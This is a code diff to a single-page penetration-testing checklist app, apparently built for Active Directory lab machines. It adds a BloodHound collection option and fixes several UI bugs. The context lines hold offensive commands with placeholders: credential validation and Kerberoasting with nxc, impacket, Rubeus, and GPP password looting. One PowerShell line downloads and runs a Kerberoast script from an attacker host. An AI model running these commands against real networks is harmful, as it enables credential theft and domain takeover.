@@ -900,7 +900,7 @@ const TRACKS=[
  {n:2,title:"First creds",tag:"recon",goal:"Turn one credential into a map of the domain",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Validate and see where the cred works",c:"nxc smb {IP} -u {USER} -p {PASS}    # (Pwn3d! means local admin there)",l:"Run it across the whole range to find where this account is admin."},
    {d:"Collect BloodHound data",c:"bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"Do this early. It draws the shortest path to Domain Admin for you."},
-   {d:"Collector not working? there are three, and they disagree",c:"rusthound-ce -d {DOMAIN} -u {USER} -p {PASS} -i {IP} -c All -z\n.\\SharpHound.exe -c All --zipfilename out.zip        # from a Windows session\nbloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"<b>RustHound-CE</b> is the current collector for BloodHound Community Edition: one static Rust binary, much faster than the Python one and far less fussy about a broken LDAP or DNS setup, which is usually what makes <code>bloodhound-python</code> fail. <b>SharpHound</b> runs from a Windows session and sees things a remote collector cannot. If a collection looks suspiciously empty, try another collector before believing the graph — and check the clock, since Kerberos fails on more than five minutes of skew."},
+   {d:"Collector not working? there are four, and they disagree",c:"nxc ldap {IP} -u {USER} -p {PASS} --bloodhound --collection All --dns-server {IP}\nrusthound-ce -d {DOMAIN} -u {USER} -p {PASS} -i {IP} -c All -z\n.\\SharpHound.exe -c All --zipfilename out.zip        # from a Windows session\nbloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"<b>nxc</b> collects over the LDAP session it has already authenticated — same credential, same syntax and same tool as every other line on this track, so there is nothing extra to install or get working. Two things catch people out: <code>--dns-server</code> is almost always required (point it at the DC, which is the domain's DNS), and the zip is written to <code>~/.nxc/logs/</code> rather than the directory you ran it from. <b>RustHound-CE</b> is the current collector for BloodHound Community Edition: one static Rust binary, much faster than the Python one and far less fussy about a broken LDAP or DNS setup, which is usually what makes <code>bloodhound-python</code> fail. <b>SharpHound</b> runs from a Windows session and sees things a remote collector cannot. If a collection looks suspiciously empty, try another collector before believing the graph — and check the clock, since Kerberos fails on more than five minutes of skew."},
    {d:"Kerberoast from the box itself, with no impacket and no creds to type",c:"setspn.exe -Q */*                       # native, already on every domain host\nIEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/Invoke-Kerberoast.ps1')\nInvoke-Kerberoast -OutputFormat hashcat | fl\n.\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",l:"The impacket route needs a password you can type; on an RDP or shell session you often have a <b>token</b> instead — already authenticated, no plaintext anywhere. <code>setspn -Q */*</code> is built into Windows and lists every SPN in the domain, so it finds the roastable accounts even where you cannot run anything else. <b>Rubeus</b> is the fuller tool if you can drop a binary. Crack the output the same way (hashcat -m 13100). The <i>Corp</i> room."},
    {d:"Kerberoast service accounts",c:"impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request",l:"Crack $krb5tgs$ offline (hashcat -m 13100). Service accounts often have weak passwords."},
    {d:"Read shares and GPP for more creds",c:"nxc smb {IP} -u {USER} -p {PASS} -M gpp_password; nxc smb {IP} -u {USER} -p {PASS} --shares",l:"SYSVOL GPP passwords and readable shares are common cred sources."},
@@ -1169,7 +1169,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.10.0";
+const APP_VERSION="1.11.0";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -1435,9 +1435,16 @@ function updateBar(){
   });
 }
 function applyProg(){
+  // The planner and the SUID cross-reference render .step rows that carry a
+  // command but no tick, and the overlay keeps its last output after closing.
+  // Assuming every .step has a checkbox threw on the first of those and killed
+  // the loop, so the bar froze AND the remaining steps never had their saved
+  // ticks applied -- your progress looked lost the moment you used the planner.
   document.querySelectorAll(".step").forEach(st=>{
+    const cb=st.querySelector("input[type=checkbox]");
+    if(!cb)return;
     const on=!!progress[st.dataset.id];
-    st.querySelector("input").checked=on;
+    cb.checked=on;
     st.classList.toggle("done",on);
   });
   updateBar();
@@ -1489,6 +1496,19 @@ function renderTrack(track){
   document.querySelectorAll(".track-pill").forEach(p=>p.classList.toggle("active",p.dataset.id===track.id));
   host.style.setProperty("--c",track.colour);
   host.innerHTML="";
+  // This is now the landing view, and a wall of checkboxes does not tell you
+  // that pasting a scan is what makes the rest of the page work. Say so, once,
+  // and only while there is nothing parsed.
+  if(track.id==="recon"&&!ctx.scanned){
+    const cta=document.createElement("div");cta.className="empty-cta";
+    const h3=document.createElement("h3");h3.textContent="Paste your scan first";
+    const p=document.createElement("p");
+    p.textContent="The steps below work without one, but a scan fills in your IP, lists the right commands for every open port, orders the tracks by what it finds, and unlocks the steps you can actually run.";
+    const b=document.createElement("button");b.className="genbtn";b.type="button";
+    b.textContent="open the scan planner";b.onclick=()=>renderPlanner();
+    cta.appendChild(h3);cta.appendChild(p);cta.appendChild(b);
+    host.appendChild(cta);
+  }
   host.appendChild(toolbar(host,track.name));
   track.phases.forEach(ph=>{
     const det=document.createElement("details");det.className="phase";det.style.setProperty("--c",track.colour);
@@ -1582,6 +1602,10 @@ function renderTrack(track){
     det.appendChild(body);host.appendChild(det);
   });
   refreshTokens();applyProg();
+  // The live cues used to be filled only by renderOverview, which was always
+  // the landing view. It no longer is, so a track has to keep them current too
+  // or the stuck panel opens empty on the page you actually start on.
+  renderStuckLive();
 }
 
 // ---------- scan planner ----------
@@ -3617,9 +3641,14 @@ function applyView(v){
     return false;
   }finally{_applyingView=false;}
 }
+// Recon is where you start, so that is where the page opens. Once there is a
+// scan the board is the more useful landing -- it summarises what was found --
+// but by then you have almost always been somewhere, and the remembered view
+// wins over both.
+function defaultView(){return loadScan().length?"overview":"track=recon";}
 function currentView(){
   const h=(location.hash||"").replace(/^#/,"");
-  return h||store.get("view2:"+boxId(),"")||"overview";
+  return h||store.get("view2:"+boxId(),"")||defaultView();
 }
 
 // ---------- live cues in the stuck panel ----------
@@ -4103,7 +4132,7 @@ refreshChrome();
 document.getElementById("drawer").addEventListener("toggle",e=>{if(e.target.open)renderStuckLive();});
 document.querySelector(".stuck details").addEventListener("toggle",e=>{if(e.target.open)renderStuckLive();});
 
-if(!applyView(currentView()))renderOverview();
+if(!applyView(currentView())&&!applyView(defaultView()))renderOverview();
 </script>
 </body>
 </html>
